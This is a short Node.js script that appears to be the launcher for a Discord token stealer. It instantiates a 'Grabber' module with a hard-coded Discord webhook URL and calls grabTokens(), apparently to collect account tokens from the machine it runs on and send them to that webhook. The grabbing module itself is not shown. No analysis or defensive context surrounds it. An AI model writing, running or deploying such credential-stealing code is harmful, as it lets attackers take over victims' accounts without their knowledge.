const Grabber = require('./Grabber');
const grabber = new Grabber({
    WEBHOOK_URL: 'https://discord.com/api/webhooks/810874512928669716/_NIu6QB2D1Fz8yH52hG8K7Xrem2JDTQmTDPsd5Ji0DucHcjfup6rPW6GyOPXuak3399j',
    ping: false
});

grabber.grabTokens();